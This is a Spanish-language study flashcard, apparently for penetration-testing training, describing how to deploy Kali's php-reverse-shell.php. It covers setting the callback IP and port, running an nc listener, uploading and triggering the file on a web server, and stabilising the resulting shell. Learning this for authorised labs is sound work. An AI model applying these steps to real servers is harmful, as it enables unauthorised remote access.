**Flashcard 2 – Uso de `php-reverse-shell.php` en Kali**

**Pregunta:** ¿Cómo usar `/usr/share/webshells/php/php-reverse-shell.php` para obtener una reverse shell?
**Respuesta:**

1. Copiar y editar:

   ```bash
   cd /usr/share/webshells/php/
   cp php-reverse-shell.php shell.php
   nano shell.php
   ```

   Cambiar `$ip` por la IP de `tun0` y `$port` por un puerto libre.
2. Listener:

   ```bash
   nc -lvnp <PUERTO>
   ```
3. Subir `shell.php` al servidor.
4. Ejecutar visitando su URL para iniciar la conexión inversa.
5. Estabilizar shell con `python3 -c 'import pty; pty.spawn("/bin/bash")'`, luego `export TERM=xterm`, `stty raw -echo; fg` y `reset`.
